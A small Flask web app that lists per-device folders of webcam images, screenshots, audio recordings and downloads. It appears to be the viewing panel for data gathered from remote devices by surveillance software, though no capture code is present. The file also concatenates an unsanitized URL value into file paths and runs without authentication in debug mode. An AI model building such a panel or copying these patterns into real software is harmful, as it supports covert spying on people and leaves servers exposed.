from flask import Flask
from flask import render_template
import os
from werkzeug.security import generate_password_hash

app = Flask(__name__)
DEVICE_LIST = []

@app.route('/')
def index():
    DEVICE_LIST = None
    if os.path.isdir('static/Device'):
        DEVICE_LIST = os.listdir('static/Device')
    return render_template('index.html', DEVICE_LIST = DEVICE_LIST)

@app.route('/<device_name>')
def webcam(device_name):
    DEVICE_GALLERY = None
    DEVICE_SCREENSHOT = None
    DEVICE_AUDIO_RECORD = None
    DEVICE_DOWNLOAD = None
    if os.path.isdir('static/Device/' + str(device_name) + "/Webcam"):
        DEVICE_GALLERY = os.listdir('static/Device/' + str(device_name) + "/Webcam")
    if os.path.isdir('static/Device/' + str(device_name) + "/Screenshot"):
        DEVICE_SCREENSHOT = os.listdir('static/Device/' + str(device_name) + "/Screenshot")
    if os.path.isdir('static/Device/' + str(device_name) + "/Audio Record"):
        DEVICE_AUDIO_RECORD = os.listdir('static/Device/' + str(device_name) + "/Audio Record")
    if os.path.isdir('static/Device/' + str(device_name) + "/Download"):
        DEVICE_DOWNLOAD = os.listdir('static/Device/' + str(device_name) + "/Download")
    return render_template('index.html', DEVICE_GALLERY = DEVICE_GALLERY, 
                           DEVICE_SCREENSHOT = DEVICE_SCREENSHOT,
                           DEVICE_AUDIO_RECORD = DEVICE_AUDIO_RECORD,
                           DEVICE_DOWNLOAD = DEVICE_DOWNLOAD, 
                           device_name = device_name)

@app.route('/download')
def download():

    return render_template('download.html')

if __name__ == '__main__':
    app.run(host="localhost", port = 442, debug = True)